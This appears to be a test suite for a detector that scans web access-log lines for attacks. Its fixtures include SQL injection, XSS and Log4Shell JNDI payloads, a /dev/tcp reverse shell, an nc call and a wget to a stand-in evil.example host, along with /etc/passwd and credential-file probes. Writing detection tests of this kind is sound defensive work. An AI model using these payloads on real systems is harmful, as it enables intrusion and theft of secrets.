import { describe, expect, it } from 'vitest';

import { parseLine } from '../../core/basicParse';
import { detectInLine } from './detect';
import type { AttackTypeId } from './types';

function typesIn(raw: string): AttackTypeId[] {
  return [...new Set(detectInLine(parseLine(raw, 0)).map((hit) => hit.type))];
}

function access(target: string, agent = 'Mozilla/5.0'): string {
  return `203.0.113.9 - - [03/Nov/2026:10:00:00 +0000] "GET ${target} HTTP/1.1" 200 512 "-" "${agent}"`;
}

describe('SQL injection', () => {
  it.each([
    '/items?id=1+union+select+username,password+from+users',
    '/items?id=1%20UNION%20ALL%20SELECT%20NULL,NULL',
    '/items?id=1/**/union/**/select/**/1',
    "/login?user=admin' or 1=1--",
    '/login?user=admin%27%20OR%20%271%27%3D%271',
    "/login?user=' or ''='",
    '/items?id=1 and 1=1',
    '/items?id=1 AND SLEEP(5)',
    "/items?id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    '/items?id=1;SELECT pg_sleep(10)',
    '/items?id=1 and benchmark(5000000,md5(1))',
    '/items?id=1 union select table_name from information_schema.tables',
    "/login?user=admin'-- ",
    '/items?id=1; drop table users',
    '/items?id=%2527%2520or%25201%253D1',
  ])('flags %s', (target) => {
    expect(typesIn(access(target))).toContain('sqlInjection');
  });

  it.each([
    '/search?q=union+of+soviet+republics',
    '/search?q=select+shoes&sort=price',
    '/api/users?order=asc&limit=10',
    '/products/sleep-aid',
    '/search?q=1+or+2',
    '/docs/information',
    "/blog/it's-a-trap",
    '/api/v1/orders/1234/items?page=2',
  ])('leaves %s alone', (target) => {
    expect(typesIn(access(target))).not.toContain('sqlInjection');
  });

  it('does not flag a thread that sleeps in an application log', () => {
    expect(typesIn('2026-11-03T10:00:00Z DEBUG worker calling sleep(500) before retry')).toEqual(
      [],
    );
  });
});

describe('cross-site scripting', () => {
  it.each([
    '/search?q=<script>alert(1)</script>',
    '/search?q=%3Cscript%3Ealert(1)%3C/script%3E',
    '/search?q=%253Cscript%253E',
    '/search?q="><img src=x onerror=alert(1)>',
    '/p?name=%22%20onfocus%3Dalert(1)%20autofocus%3D%22',
    '/redirect?url=javascript:alert(document.cookie)',
    '/search?q=<svg/onload=alert(1)>',
  ])('flags %s', (target) => {
    expect(typesIn(access(target))).toContain('xss');
  });

  it.each([
    '/search?q=javascript+tutorial',
    '/blog/what-is-a-script',
    '/search?q=<b>bold</b>',
    '/api?callback=onload',
    '/static/app.js',
  ])('leaves %s alone', (target) => {
    expect(typesIn(access(target))).not.toContain('xss');
  });
});

describe('path traversal', () => {
  it.each([
    '/download?file=../../../etc/passwd',
    '/download?file=..%2f..%2f..%2fetc%2fpasswd',
    '/download?file=%2e%2e/%2e%2e/secret',
    '/download?file=%252e%252e%252fsecret',
    '/static/..%5c..%5cwindows/win.ini',
    '/static/../app/config.json',
    '/files/....//....//secret',
  ])('flags %s', (target) => {
    expect(typesIn(access(target))).toContain('pathTraversal');
  });

  it('flags a system file named in a plain application line', () => {
    expect(typesIn('ERROR open /etc/passwd denied for upload handler')).toContain('pathTraversal');
  });

  it.each([
    '/files/archive.v1.2/readme.txt',
    '/images/photo..final.png',
    '/docs/v1..v2/diff',
    '/etc/hosts-guide',
  ])('leaves %s alone', (target) => {
    expect(typesIn(access(target))).not.toContain('pathTraversal');
  });

  it('does not flag relative imports in a build error', () => {
    expect(typesIn("Module not found: Can't resolve '../utils/helpers' in src")).toEqual([]);
  });
});

describe('command injection', () => {
  it.each([
    '/ping?host=1.1.1.1;cat /etc/passwd',
    '/ping?host=1.1.1.1%3Bcat%20/etc/passwd',
    '/ping?host=1.1.1.1|nc 10.0.0.1 4444',
    '/ping?host=$(whoami)',
    '/ping?host=`id`',
    '/ping?host=1;id',
    '/run?cmd=a;wget http://evil.example/x.sh',
    '/run?cmd=bash -i >& /dev/tcp/10.0.0.1/4444',
    '/run?cmd=cat${IFS}/etc/hosts',
  ])('flags %s', (target) => {
    expect(typesIn(access(target))).toContain('commandInjection');
  });

  it.each([
    '/items?a=1&id=5',
    '/items?a=1;id=5',
    '/search?q=cat+food',
    '/search?q=who+am+i',
    '/a?x=1|2',
    '/blog/how-to-use-curl',
  ])('leaves %s alone', (target) => {
    expect(typesIn(access(target))).not.toContain('commandInjection');
  });
});

describe('Log4Shell', () => {
  it.each([
    '/?x=${jndi:ldap://evil.example/a}',
    '/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D',
    '/?x=${${lower:j}ndi:ldap://evil.example/a}',
    '/?x=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/a}',
  ])('flags %s', (target) => {
    expect(typesIn(access(target))).toContain('log4shell');
  });

  it('flags a payload hidden in a user agent', () => {
    expect(typesIn(access('/', '${jndi:ldap://evil.example/a}'))).toContain('log4shell');
  });

  it('leaves ordinary template text alone', () => {
    expect(typesIn('rendered ${user.name} with ${env} and ${HOME}')).toEqual([]);
  });
});

describe('sensitive paths', () => {
  it.each([
    '/.env',
    '/app/.env.production',
    '/.git/config',
    '/.aws/credentials',
    '/wp-admin/setup-config.php',
    '/wp-login.php',
    '/phpMyAdmin/index.php',
    '/xmlrpc.php',
    '/server-status',
    '/actuator/env',
    '/.%65nv',
  ])('flags %s', (target) => {
    expect(typesIn(access(target))).toEqual(['sensitivePath']);
  });

  it.each([
    '/environment',
    '/api/.environment',
    '/wp-admin/admin-ajax.php',
    '/blog/git-config-tips',
    '/phpmyadmin-guide',
    '/server-status-page',
    '/actuator/health',
  ])('leaves %s alone', (target) => {
    expect(typesIn(access(target))).not.toContain('sensitivePath');
  });

  it('does not treat a path in an application line as a request', () => {
    expect(typesIn('INFO config loaded from /srv/app/.env')).toEqual([]);
  });
});

describe('scanner user agents', () => {
  it.each([
    'sqlmap/1.7',
    'Nikto/2.1.6',
    'Nmap Scripting Engine',
    'DirBuster-1.0',
    'gobuster/3.5',
    'Acunetix-Product',
    'masscan/1.3',
    'zgrab/0.x',
    'WPScan v3.8',
  ])('flags the agent %s', (agent) => {
    expect(typesIn(access('/', agent))).toEqual(['scannerAgent']);
  });

  it.each([
    'Mozilla/5.0 (Windows NT 10.0) Chrome/120',
    'curl/8.4.0',
    'Googlebot/2.1',
    'okhttp/4.12',
  ])('leaves the agent %s alone', (agent) => {
    expect(typesIn(access('/', agent))).toEqual([]);
  });
});

describe('hits', () => {
  it('carry the line index, the signature and the client address', () => {
    const [hit] = detectInLine(parseLine(access('/.env'), 7));
    expect(hit).toEqual({
      lineIndex: 7,
      type: 'sensitivePath',
      signatureId: 'path-env',
      address: '203.0.113.9',
    });
  });

  it('have no address when the line has none', () => {
    const [hit] = detectInLine(parseLine('GET /.env HTTP/1.1', 0));
    expect(hit.address).toBeNull();
  });
});
